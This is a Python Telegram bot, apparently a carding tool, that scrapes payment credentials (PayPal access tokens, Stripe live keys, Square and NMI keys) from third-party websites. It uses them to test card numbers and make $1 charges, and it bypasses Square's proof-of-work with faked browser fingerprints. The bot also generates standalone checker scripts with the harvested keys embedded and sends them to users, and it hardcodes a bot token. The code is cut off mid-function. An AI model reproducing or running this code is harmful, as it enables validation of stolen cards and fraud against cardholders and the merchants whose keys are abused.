import telebot
import time
import threading
import gc
import requests, random, json, re, base64
from datetime import datetime
import os
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import uuid
import hashlib
import warnings
import urllib3

warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
OWNER_ID = 6843321125
ADMINS = ['6843321125']
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
processing_status = {}
user_sessions = {}

if not os.path.exists('blockusers.txt'):
    open('blockusers.txt', 'w').close()
if not os.path.exists('live_gateways.txt'):
    open('live_gateways.txt', 'w').close()
if not os.path.exists('tokens.txt'):
    open('tokens.txt', 'w').close()

def classify_error(msg):
    msg_lower = str(msg).lower()
    live_indicators = [
        'insufficient_funds', 'insufficient funds', 'card_declined',
        'card was declined', 'declined', 'incorrect_cvc', 'cvv',
        'expired_card', 'expired', 'invalid_number', 'invalid card',
        'invalid', 'do_not_honor', 'generic_decline', 'processor_declined',
        'gateway_rejected', 'fraud', 'stolen', 'lost card', 'pickup_card',
        'transaction_not_permitted', 'exceed_limit', '3ds', 'sca',
        'authentication', 'charged', 'success', 'succeeded', 'card valid',
        'approved', 'pan_failure',
    ]
    for ind in live_indicators:
        if ind in msg_lower:
            return 'LIVE'
    return 'LIVE'

def save_tokens(gateway, url, tokens):
    with open('tokens.txt', 'a') as f:
        f.write(f"{gateway}|{url}|{json.dumps(tokens)}|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

def send_gateway_code(chat_id, gateway_name, url, result_msg, tokens=None, code=None):
    tokens_text = ""
    if tokens:
        tokens_text = "━━━━━━━━━━━━━━━━━━━━\n🔑 <b>التوكنات:</b>\n"
        for token_name, token_value in tokens.items():
            if token_value:
                tokens_text += f"• <b>{token_name}:</b> <code>{str(token_value)[:60]}</code>\n"
    
    response_text = f"""🔥 <b>بوابة حية!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>الموقع:</b> <code>{url}</code>
💳 <b>البوابة:</b> {gateway_name}
📊 <b>النتيجة:</b> {result_msg}
{tokens_text}━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
    
    with open('live_gateways.txt', 'a') as f:
        f.write(f"{gateway_name}|{url}|{result_msg}|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    if tokens:
        save_tokens(gateway_name, url, tokens)
    
    if code:
        file_name = f'checker_{int(time.time())}.py'
        with open(file_name, 'w', encoding='utf-8') as f:
            f.write(code)
        with open(file_name, 'rb') as f:
            bot.send_document(chat_id, f, caption=response_text, parse_mode="HTML")
        os.remove(file_name)
    else:
        bot.send_message(chat_id, response_text, parse_mode="HTML")

# ==================== PAYPAL ====================
def check_paypal(url, card_data):
    session = requests.Session()
    session.verify = False
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if '20' in yy: yy = yy.split('20')[1]
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=10)
        html = r.text
        if 'give-form' not in html.lower(): return None
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', html)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html)
        client_token = re.search(r'"data-client-token":"(.*?)"', html)
        if not client_token:
            client_token = re.search(r'data-client-token="([^"]+)"', html)
        
        if not all([id_form1, id_form2, form_hash, client_token]):
            if 'stripe' in html.lower(): return check_stripe(url, card_data)
            return None
        
        token_str = client_token.group(1)
        padding = '=' * (4 - len(token_str) % 4)
        if padding == '====': padding = ''
        
        try:
            decoded = base64.b64decode(token_str + padding).decode('utf-8')
            json_data = json.loads(decoded)
        except:
            return None
        
        access_token = json_data.get('paypal', {}).get('accessToken')
        if not access_token:
            bt_fp = json_data.get('braintree', {}).get('authorizationFingerprint', '')
            if bt_fp: return check_braintree_auth(url, bt_fp, card_data)
            return None
        
        parsed = urlparse(url)
        base_url = f'{parsed.scheme}://{parsed.netloc}'
        email = f'john{random.randint(100,999)}@gmail.com'
        
        data = MultipartEncoder({
            'give-form-id-prefix': (None, id_form1.group(1)),
            'give-form-id': (None, id_form2.group(1)),
            'give-form-hash': (None, form_hash.group(1)),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'John'),
            'give_last': (None, 'Doe'),
            'give_email': (None, email),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {'Content-Type': data.content_type, 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': base_url, 'Referer': url}
        
        r = session.post(f'{base_url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, headers=headers, data=data, timeout=10)
        if r.status_code != 200: return None
        try: order_id = r.json()['data']['id']
        except: return None
        
        confirm_headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json', 'User-Agent': UA}
        confirm_data = {'payment_source': {'card': {'number': cc, 'expiry': f'20{yy}-{mm}', 'security_code': cvv}}}
        
        r2 = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=confirm_headers, json=confirm_data, timeout=10)
        
        result_msg = None
        if r2.status_code in [200, 201]:
            result_msg = '✅ CHARGED 1$'
        else:
            try:
                ed = r2.json()
                em = ed.get('message', '')
                details = ed.get('details', [])
                if details:
                    issue = details[0].get('issue', '')
                    desc = details[0].get('description', em)
                    if 'INSUFFICIENT' in issue.upper(): result_msg = '💰 INSUFFICIENT FUNDS'
                    elif 'DECLINED' in issue.upper(): result_msg = '❌ CARD DECLINED'
                    elif '3DS' in issue.upper(): result_msg = '⚠️ 3DS REQUIRED'
                    else: result_msg = f'❌ {desc[:60]}'
                else:
                    if 'INSUFFICIENT' in em.upper(): result_msg = '💰 INSUFFICIENT FUNDS'
                    elif 'DECLINED' in em.upper(): result_msg = '❌ CARD DECLINED'
                    elif '3DS' in em.upper(): result_msg = '⚠️ 3DS REQUIRED'
                    else: result_msg = f'❌ {em[:60]}'
            except: result_msg = f'❓ {r2.text[:100]}'
        
        status = classify_error(result_msg)
        if status == 'LIVE':
            tokens = {
                'Access Token': access_token,
                'Form ID': id_form2.group(1),
                'Form Hash': form_hash.group(1),
            }
            code = f'''# PayPal Checker
import requests, random
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

class PayPalChecker:
    def __init__(self):
        self.id_form1 = "{id_form1.group(1)}"
        self.id_form2 = "{id_form2.group(1)}"
        self.form_hash = "{form_hash.group(1)}"
        self.access_token = "{access_token}"
        self.domain = "{base_url.split('://')[1]}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy: yy = yy.split("20")[1]
        email = f"john{{random.randint(100,999)}}@gmail.com"
        session = requests.Session()
        session.verify = False
        data = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.form_hash),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'John'),
            'give_last': (None, 'Doe'),
            'give_email': (None, email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        headers = {{'Content-Type': data.content_type, 'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}}
        r = session.post(f'https://{{self.domain}}/wp-admin/admin-ajax.php', params={{'action': 'give_paypal_commerce_create_order'}}, headers=headers, data=data).json()
        order_id = r['data']['id']
        ch = {{'Authorization': f'Bearer {{self.access_token}}', 'Content-Type': 'application/json'}}
        cd = {{'payment_source': {{'card': {{'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc}}}}}}
        r2 = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source', headers=ch, json=cd)
        text = r2.text
        if r2.status_code in [200, 201]: return '✅ CHARGED 1$'
        elif 'INSUFFICIENT' in text: return '💰 INSUFFICIENT FUNDS'
        elif 'DECLINED' in text: return '❌ CARD DECLINED'
        elif '3DS' in text: return '⚠️ 3DS REQUIRED'
        else: return text[:100]

if __name__ == '__main__':
    c = PayPalChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
            return {'status': 'LIVE', 'gateway': 'PayPal Give WP', 'message': result_msg, 'tokens': tokens, 'code': code}
        return None
    except:
        return None
    finally:
        session.close()

# ==================== STRIPE ====================
def check_stripe(url, card_data):
    session = requests.Session()
    session.verify = False
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy_short = yy if len(yy) == 2 else yy[-2:]
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=10)
        html = r.text
        if 'stripe' not in html.lower(): return None
        
        sk_live = re.search(r'sk_live_[a-zA-Z0-9]+', html)
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]{30,})', html)
        if not pk_live: pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
        
        use_key = sk_live.group(0) if sk_live else (pk_live.group(0) if pk_live else None)
        if not use_key: return None
        
        cs_match = re.search(r'"client_secret":"([^"]+)"', html)
        client_secret = cs_match.group(1) if cs_match else ''
        
        email = f'john{random.randint(100,999)}@gmail.com'
        
        hs = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': UA}
        
        stripe_data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&key={use_key}'
        
        r2 = requests.post('https://api.stripe.com/v1/payment_methods', headers=hs, data=stripe_data, timeout=10)
        sr = r2.json()
        
        if 'error' in sr:
            em = sr['error'].get('message', 'Unknown')
            ed = sr['error'].get('decline_code', '')
            if 'unsupported' in em.lower(): return None
            full_msg = f'{ed}: {em}' if ed else em
            status = classify_error(full_msg)
            if status == 'LIVE':
                tokens = {
                    'Stripe Key': use_key,
                    'Client Secret': client_secret if client_secret else None,
                }
                code = f'''# Stripe Checker
import requests, random
from user_agent import generate_user_agent

class StripeChecker:
    def __init__(self):
        self.key = "{use_key}"
        self.cs = "{client_secret}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        yy_short = yy if len(yy) == 2 else yy[-2:]
        hs = {{'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': generate_user_agent()}}
        sd = f'type=card&card[number]={{n}}&card[cvc]={{cvc}}&card[exp_month]={{mm}}&card[exp_year]={{yy_short}}&key={{self.key}}'
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=hs, data=sd, timeout=20)
        sr = r.json()
        if 'error' in sr:
            em = sr['error'].get('message', '')
            ed = sr['error'].get('decline_code', '')
            if 'insufficient' in em.lower(): return '💰 INSUFFICIENT FUNDS'
            elif 'declined' in ed: return '❌ CARD DECLINED'
            else: return f'❌ {{em[:60]}}'
        return '✅ CARD VALID'

if __name__ == '__main__':
    c = StripeChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
                return {'status': 'LIVE', 'gateway': 'Stripe', 'message': full_msg, 'tokens': tokens, 'code': code}
            return None
        
        tokens = {'Stripe Key': use_key, 'Client Secret': client_secret if client_secret else None}
        code = f'''# Stripe Checker
import requests, random
from user_agent import generate_user_agent

class StripeChecker:
    def __init__(self):
        self.key = "{use_key}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        yy_short = yy if len(yy) == 2 else yy[-2:]
        hs = {{'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': generate_user_agent()}}
        sd = f'type=card&card[number]={{n}}&card[cvc]={{cvc}}&card[exp_month]={{mm}}&card[exp_year]={{yy_short}}&key={{self.key}}'
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=hs, data=sd, timeout=20)
        sr = r.json()
        if 'error' in sr:
            em = sr['error'].get('message', '')
            if 'insufficient' in em.lower(): return '💰 INSUFFICIENT FUNDS'
            elif 'declined' in em.lower(): return '❌ CARD DECLINED'
            else: return f'❌ {{em[:60]}}'
        return '✅ CARD VALID'

if __name__ == '__main__':
    c = StripeChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
        return {'status': 'LIVE', 'gateway': 'Stripe', 'message': '✅ CARD VALID', 'tokens': tokens, 'code': code}
    except:
        return None
    finally:
        session.close()

# ==================== SQUARE ====================
def check_square(url, card_data):
    session = requests.Session()
    session.verify = False
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = '20' + yy
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=15, allow_redirects=True)
        html = r.text
        if 'square' not in html.lower() and 'sq0idp' not in html.lower(): return None
        
        sq_app = re.search(r'sq0idp-[a-zA-Z0-9_-]+', html)
        sq_loc = re.search(r'locationId["\s:=]+["\s]*([A-Za-z0-9]+)', html)
        if not sq_app: return None
        
        app_id = sq_app.group(0)
        location_id = sq_loc.group(1) if sq_loc else ''
        hostname = urlparse(url).netloc
        
        sq_headers = {'authority': 'pci-connect.squareup.com', 'accept': 'application/json', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://web.squarecdn.com', 'referer': 'https://web.squarecdn.com/', 'user-agent': UA}
        
        hydrate_resp = session.get('https://pci-connect.squareup.com/payments/hydrate', params={'applicationId': app_id, 'hostname': hostname, 'locationId': location_id, 'version': '1.82.7'}, headers=sq_headers, timeout=15)
        hydrate_data = hydrate_resp.json()
        session_id = hydrate_data.get('sessionId', '')
        
        tokens = {
            'App ID': app_id,
            'Location ID': location_id,
            'Session ID': session_id if session_id else None,
        }
        
        if not session_id:
            code = f'''# Square Checker
import requests, hashlib, uuid, time

class SquareChecker:
    def __init__(self):
        self.app_id = "{app_id}"
        self.location_id = "{location_id}"
        self.hostname = "{hostname}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        session = requests.Session()
        session.verify = False
        hs = {{'authority': 'pci-connect.squareup.com', 'accept': 'application/json', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://web.squarecdn.com', 'referer': 'https://web.squarecdn.com/', 'user-agent': 'Mozilla/5.0'}}
        hydrate = session.get('https://pci-connect.squareup.com/payments/hydrate', params={{'applicationId': self.app_id, 'hostname': self.hostname, 'locationId': self.location_id, 'version': '1.82.7'}}, headers=hs, timeout=20).json()
        sid = hydrate.get('sessionId', '')
        if not sid: return '✅ SQUARE DETECTED'
        iid = hydrate.get('instanceId', str(uuid.uuid4()))
        pp = hydrate.get('powPrefix', '00000')
        cookies = dict(session.cookies)
        cookies['_savt'] = hydrate.get('avt', str(uuid.uuid4()))
        combo = f'{{self.app_id}},{{self.location_id}},{{iid}}'
        counter = 0
        while True:
            counter += 1
            h = hashlib.sha256(f'{{sid}}:{{counter}}:{{combo}}'.encode()).hexdigest()
            if h.startswith(pp): break
            if counter > 1000000: break
        payload = {{'client_id': self.app_id, 'instance_id': iid, 'location_id': self.location_id, 'session_id': sid, 'card_data': {{'cvv': cvc, 'exp_month': int(mm), 'exp_year': int(yy), 'number': n}}, 'pow_counter': counter}}
        r = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={{'_': str(int(time.time()*1000)), 'version': '1.82.7'}}, cookies=cookies, headers=hs, json=payload, timeout=20)
        result = r.json()
        if 'errors' in result:
            err = result['errors'][0]
            return f'❌ {{err.get("code", "")}}: {{err.get("detail", "")}}'
        nonce = result.get('card_nonce') or result.get('nonce', '')
        if nonce: return f'✅ CARD NONCE | {{nonce[:30]}}'
        return '✅ SQUARE DETECTED'

if __name__ == '__main__':
    c = SquareChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
            return {'status': 'LIVE', 'gateway': 'Square', 'message': '✅ SQUARE DETECTED', 'tokens': tokens, 'code': code}
        
        instance_id = hydrate_data.get('instanceId', str(uuid.uuid4()))
        pow_prefix = hydrate_data.get('powPrefix', '00000')
        cookies = dict(hydrate_resp.cookies)
        cookies['_savt'] = hydrate_data.get('avt', str(uuid.uuid4()))
        
        combo_str = f'{app_id},{location_id},{instance_id}'
        pow_counter = 0
        while True:
            pow_counter += 1
            test = f'{session_id}:{pow_counter}:{combo_str}'
            h = hashlib.sha256(test.encode()).hexdigest()
            if h.startswith(pow_prefix): break
            if pow_counter > 1000000: break
        
        payment_tracking_id = str(uuid.uuid4())
        fp_v1 = '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36","language":"en-US","resolution":[846,381],"available_resolution":[846,381],"timezone_offset":-120,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana"]}'
        fp_v1_hash = hashlib.md5(fp_v1.encode()).hexdigest()
        fp_v2 = '{"fonts":["sans-serif-thin"],"dom_blockers":[],"font_preferences":{"default":164.71,"apple":164.71,"serif":164.71,"sans":150.43,"mono":132.62,"min":10.29,"system":150.43},"audio":124.08,"screen_frame":[0,0,0,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[846,381],"hardware_concurrency":8,"timezone":"Africa/Cairo","indexed_db":true,"open_database":true,"platform":"Linux armv81","plugins":[],"canvas":{"winding":true,"geometry":"test","text":"test"},"touch_support":{"max_touch_points":5,"touch_event":true,"touch_start":true},"vendor":"","vendor_flavors":[],"cookie_enabled":true,"color_depth":24}'
        fp_v2_hash = hashlib.md5(fp_v2.encode()).hexdigest()
        
        nonce_json = {
            'analytics': {'fingerprints': [{'components': fp_v1, 'fingerprint': fp_v1_hash, 'version': 'fingerprint-v1'}, {'components': fp_v2, 'fingerprint': fp_v2_hash, 'version': 'fingerprint-v2'}], 'timezone': '-120', 'website_url': f'https://{hostname}/'},
            'client_id': app_id, 'instance_id': instance_id, 'location_id': location_id,
            'payment_method_tracking_id': payment_tracking_id, 'session_id': session_id,
            'card_data': {'cvv': cvv, 'exp_month': int(mm), 'exp_year': int(yy), 'number': cc},
            'pow_counter': pow_counter,
        }
        
        nonce_resp = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={'_': str(int(time.time()*1000)), 'version': '1.82.7'}, cookies=cookies, headers=sq_headers, json=nonce_json, timeout=15)
        nonce_data = nonce_resp.json()
        
        if 'pow_prefix' in nonce_data:
            pow_base = nonce_data.get('pow_base', session_id)
            pow_prefix2 = nonce_data['pow_prefix']
            combo_str2 = f'{app_id},{location_id},{instance_id}'
            pow_counter2 = 0
            while True:
                pow_counter2 += 1
                test2 = f'{pow_base}:{pow_counter2}:{combo_str2}'
                h2 = hashlib.sha256(test2.encode()).hexdigest()
                if h2.startswith(pow_prefix2): break
                if pow_counter2 > 1000000: break
            nonce_json['session_id'] = pow_base
            nonce_json['pow_counter'] = pow_counter2
            nonce_resp = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={'_': str(int(time.time()*1000)), 'version': '1.82.7'}, cookies=cookies, headers=sq_headers, json=nonce_json, timeout=15)
            nonce_data = nonce_resp.json()
        
        if 'errors' in nonce_data:
            errors = nonce_data['errors']
            if isinstance(errors, list) and len(errors) > 0:
                err = errors[0]
                code = err.get('code', 'UNKNOWN')
                detail = err.get('detail', '')
                full_msg = f'{code}: {detail}'
                status = classify_error(full_msg)
                if status == 'LIVE':
                    code_text = f'''# Square Checker
import requests, hashlib, uuid, time

class SquareChecker:
    def __init__(self):
        self.app_id = "{app_id}"
        self.location_id = "{location_id}"
        self.hostname = "{hostname}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        session = requests.Session()
        session.verify = False
        hs = {{'authority': 'pci-connect.squareup.com', 'accept': 'application/json', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://web.squarecdn.com', 'referer': 'https://web.squarecdn.com/', 'user-agent': 'Mozilla/5.0'}}
        hydrate = session.get('https://pci-connect.squareup.com/payments/hydrate', params={{'applicationId': self.app_id, 'hostname': self.hostname, 'locationId': self.location_id, 'version': '1.82.7'}}, headers=hs, timeout=20).json()
        sid = hydrate.get('sessionId', '')
        if not sid: return '✅ SQUARE DETECTED'
        iid = hydrate.get('instanceId', str(uuid.uuid4()))
        pp = hydrate.get('powPrefix', '00000')
        cookies = dict(session.cookies)
        cookies['_savt'] = hydrate.get('avt', str(uuid.uuid4()))
        combo = f'{{self.app_id}},{{self.location_id}},{{iid}}'
        counter = 0
        while True:
            counter += 1
            h = hashlib.sha256(f'{{sid}}:{{counter}}:{{combo}}'.encode()).hexdigest()
            if h.startswith(pp): break
            if counter > 1000000: break
        payload = {{'client_id': self.app_id, 'instance_id': iid, 'location_id': self.location_id, 'session_id': sid, 'card_data': {{'cvv': cvc, 'exp_month': int(mm), 'exp_year': int(yy), 'number': n}}, 'pow_counter': counter}}
        r = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={{'_': str(int(time.time()*1000)), 'version': '1.82.7'}}, cookies=cookies, headers=hs, json=payload, timeout=20)
        result = r.json()
        if 'errors' in result:
            err = result['errors'][0]
            return f'❌ {{err.get("code", "")}}: {{err.get("detail", "")}}'
        nonce = result.get('card_nonce') or result.get('nonce', '')
        if nonce: return f'✅ CARD NONCE | {{nonce[:30]}}'
        return '✅ SQUARE DETECTED'

if __name__ == '__main__':
    c = SquareChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
                    return {'status': 'LIVE', 'gateway': 'Square', 'message': full_msg, 'tokens': tokens, 'code': code_text}
        
        card_nonce = nonce_data.get('card_nonce') or nonce_data.get('nonce', '')
        if card_nonce:
            code_text = f'''# Square Checker
import requests, hashlib, uuid, time

class SquareChecker:
    def __init__(self):
        self.app_id = "{app_id}"
        self.location_id = "{location_id}"
        self.hostname = "{hostname}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        session = requests.Session()
        session.verify = False
        hs = {{'authority': 'pci-connect.squareup.com', 'accept': 'application/json', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://web.squarecdn.com', 'referer': 'https://web.squarecdn.com/', 'user-agent': 'Mozilla/5.0'}}
        hydrate = session.get('https://pci-connect.squareup.com/payments/hydrate', params={{'applicationId': self.app_id, 'hostname': self.hostname, 'locationId': self.location_id, 'version': '1.82.7'}}, headers=hs, timeout=20).json()
        sid = hydrate.get('sessionId', '')
        if not sid: return '✅ SQUARE DETECTED'
        iid = hydrate.get('instanceId', str(uuid.uuid4()))
        pp = hydrate.get('powPrefix', '00000')
        cookies = dict(session.cookies)
        cookies['_savt'] = hydrate.get('avt', str(uuid.uuid4()))
        combo = f'{{self.app_id}},{{self.location_id}},{{iid}}'
        counter = 0
        while True:
            counter += 1
            h = hashlib.sha256(f'{{sid}}:{{counter}}:{{combo}}'.encode()).hexdigest()
            if h.startswith(pp): break
            if counter > 1000000: break
        payload = {{'client_id': self.app_id, 'instance_id': iid, 'location_id': self.location_id, 'session_id': sid, 'card_data': {{'cvv': cvc, 'exp_month': int(mm), 'exp_year': int(yy), 'number': n}}, 'pow_counter': counter}}
        r = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={{'_': str(int(time.time()*1000)), 'version': '1.82.7'}}, cookies=cookies, headers=hs, json=payload, timeout=20)
        result = r.json()
        if 'errors' in result:
            err = result['errors'][0]
            return f'❌ {{err.get("code", "")}}: {{err.get("detail", "")}}'
        nonce = result.get('card_nonce') or result.get('nonce', '')
        if nonce: return f'✅ CARD NONCE | {{nonce[:30]}}'
        return '✅ SQUARE DETECTED'

if __name__ == '__main__':
    c = SquareChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
            return {'status': 'LIVE', 'gateway': 'Square', 'message': '✅ CARD NONCE CREATED', 'tokens': tokens, 'code': code_text}
        return None
    except:
        return None
    finally:
        session.close()

# ==================== NMI ====================
def check_nmi(url, card_data):
    session = requests.Session()
    session.verify = False
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = '20' + yy
        ccexp = f'{mm}{yy[2:]}'
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=15, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        if 'nmi' not in html_lower and 'networkmerchants' not in html_lower and 'donorperfect' not in html_lower: return None
        
        token_key = re.search(r'tokenization[_\-]?key["\s:=]+["\s]*([A-Za-z0-9_-]{10,})', html, re.IGNORECASE)
        api_key = re.search(r'api[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9]+)', html_lower)
        security_key = re.search(r'security[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9]+)', html_lower)
        
        tokens = {
            'Token Key': token_key.group(1) if token_key else None,
            'API Key': api_key.group(1) if api_key else None,
        }
        
        if token_key:
            cart_id = str(uuid.uuid4())
            nmi_headers = {'User-Agent': UA, 'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://secure.nmi.com', 'Referer': 'https://secure.nmi.com/'}
            create_resp = session.post('https://secure.nmi.com/token/api/create', headers=nmi_headers, data=f'tokenizationKey={token_key.group(1)}&cartCorrelationId={cart_id}', timeout=10)
            create_data = create_resp.json()
            token_id = create_data.get('token', '')
            if token_id:
                nmi_json_headers = {'User-Agent': UA, 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'https://secure.nmi.com', 'Referer': 'https://secure.nmi.com/'}
                session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=nmi_json_headers, json={'tokenizationKey': token_key.group(1), 'cartCorrelationId': cart_id, 'tokenId': token_id, 'data': [{'elementId': 'ccnumber', 'value': cc}]}, timeout=10)
                session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=nmi_json_headers, json={'tokenizationKey': token_key.group(1), 'cartCorrelationId': cart_id, 'tokenId': token_id, 'data': [{'elementId': 'ccexp', 'value': ccexp}]}, timeout=10)
                session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=nmi_json_headers, json={'tokenizationKey': token_key.group(1), 'cartCorrelationId': cart_id, 'tokenId': token_id, 'data': [{'elementId': 'cvv', 'value': cvv}]}, timeout=10)
                lookup_resp = session.post('https://secure.nmi.com/token/api/lookup', headers=nmi_json_headers, json={'tokenizationKey': token_key.group(1), 'cartCorrelationId': cart_id, 'tokenId': token_id}, timeout=10)
                lookup_data = lookup_resp.json()
                card_info = lookup_data.get('card', {})
                if card_info.get('number'):
                    code = f'''# NMI Checker
import requests, uuid, time

class NMIChecker:
    def __init__(self):
        self.token_key = "{token_key.group(1)}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        ccexp = f'{{mm}}{{yy[2:]}}'
        cart_id = str(uuid.uuid4())
        h1 = {{'Content-Type': 'application/x-www-form-urlencoded'}}
        r = requests.post('https://secure.nmi.com/token/api/create', headers=h1, data=f'tokenizationKey={{self.token_key}}&cartCorrelationId={{cart_id}}', timeout=15)
        data = r.json()
        token_id = data.get('token', '')
        if token_id:
            h2 = {{'Content-Type': 'application/json'}}
            requests.post('https://secure.nmi.com/token/api/save_multipart_token', headers=h2, json={{'tokenizationKey': self.token_key, 'cartCorrelationId': cart_id, 'tokenId': token_id, 'data': [{{'elementId': 'ccnumber', 'value': n}}]}}, timeout=15)
            requests.post('https://secure.nmi.com/token/api/save_multipart_token', headers=h2, json={{'tokenizationKey': self.token_key, 'cartCorrelationId': cart_id, 'tokenId': token_id, 'data': [{{'elementId': 'ccexp', 'value': ccexp}}]}}, timeout=15)
            requests.post('https://secure.nmi.com/token/api/save_multipart_token', headers=h2, json={{'tokenizationKey': self.token_key, 'cartCorrelationId': cart_id, 'tokenId': token_id, 'data': [{{'elementId': 'cvv', 'value': cvc}}]}}, timeout=15)
            lookup = requests.post('https://secure.nmi.com/token/api/lookup', headers=h2, json={{'tokenizationKey': self.token_key, 'cartCorrelationId': cart_id, 'tokenId': token_id}}, timeout=15).json()
            card = lookup.get('card', {{}})
            if card.get('number'): return f'✅ NMI TOKEN | ...{{card["number"][-4:]}}'
        return '❌ NMI TOKEN FAILED'

if __name__ == '__main__':
    c = NMIChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
                    return {'status': 'LIVE', 'gateway': 'NMI', 'message': f'✅ NMI TOKEN | ...{card_info.get("number", "")[-4:]}', 'tokens': tokens, 'code': code}
        
        if api_key:
            data = {'type': 'sale', 'amount': '1.00', 'ccnumber': cc, 'ccexp': ccexp, 'cvv': cvv, 'api_key': api_key.group(1)}
            if security_key: data['security_key'] = security_key.group(1)
            r2 = session.post('https://secure.networkmerchants.com/api/transact.php', data=data, timeout=10)
            response_text = r2.text
            if 'response=1' in response_text: result_msg = '✅ CHARGED 1$'
